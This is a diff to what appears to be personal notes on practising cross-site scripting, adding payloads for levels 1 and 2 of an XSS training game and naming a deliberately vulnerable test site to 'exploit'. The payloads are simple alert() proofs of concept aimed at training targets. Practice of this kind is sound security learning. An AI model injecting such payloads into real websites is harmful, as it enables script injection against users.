@@ -15,6 +15,22 @@
 # Test 
 ```url
 https://xss-game.appspot.com/level1
+```
+- Level 1
+```
+<script>alert(1)</script>
+```
+- Level 2
+```
+<a onmouseover="alert(1)" href="#">read this!</a>
+```
+- Level 3
+```
+```
+
+----------------------------------------------------------
+# test 2
+```
 http://testphp.vulnweb.com/
 ```
 # find POST GET or input and exploit him
